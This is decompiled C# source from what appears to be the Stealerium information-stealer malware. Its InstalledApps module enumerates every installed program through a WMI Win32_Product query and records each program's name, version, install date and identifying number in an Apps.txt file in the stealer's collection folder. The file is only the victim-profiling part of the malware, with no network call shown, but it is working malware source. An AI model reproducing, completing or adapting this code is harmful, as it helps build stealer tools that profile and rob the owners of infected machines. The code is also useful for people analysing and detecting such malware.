using System;
using System.Collections.Generic;
using System.IO;
using System.Management;
using Stealerium.Helpers;

namespace Stealerium.Target.System;

internal sealed class InstalledApps
{
	internal struct App
	{
		public string Name { get; set; }

		public string Version { get; set; }

		public string IdentifyingNumber { get; set; }

		public string InstallDate { get; set; }
	}

	public static void WriteAppsList(string sSavePath)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		List<App> list = new List<App>();
		try
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("SELECT * FROM Win32_Product").Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.get_Current();
					App item = default(App);
					if (((ManagementBaseObject)val).get_Item("Name") != null)
					{
						item.Name = ((ManagementBaseObject)val).get_Item("Name").ToString();
					}
					if (((ManagementBaseObject)val).get_Item("Version") != null)
					{
						item.Version = ((ManagementBaseObject)val).get_Item("Version").ToString();
					}
					if (((ManagementBaseObject)val).get_Item("InstallDate") != null)
					{
						TimeSpan value = TimeSpan.FromSeconds(int.Parse(((ManagementBaseObject)val).get_Item("InstallDate").ToString()));
						item.InstallDate = DateTime.Today.Add(value).ToString("dd/MM/yyyy HH:mm:ss");
					}
					if (((ManagementBaseObject)val).get_Item("IdentifyingNumber") != null)
					{
						item.IdentifyingNumber = ((ManagementBaseObject)val).get_Item("IdentifyingNumber").ToString();
					}
					list.Add(item);
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			Logging.Log("InstalledApps fetch error:\n" + ex);
		}
		foreach (App item2 in list)
		{
			File.AppendAllText(sSavePath + "\\Apps.txt", "\nAPP: " + item2.Name + "\n\tVERSION: " + item2.Version + "\n\tINSTALL DATE: " + item2.InstallDate + "\n\tIDENTIFYING NUMBER: " + item2.IdentifyingNumber + "\n\n");
		}
	}
}
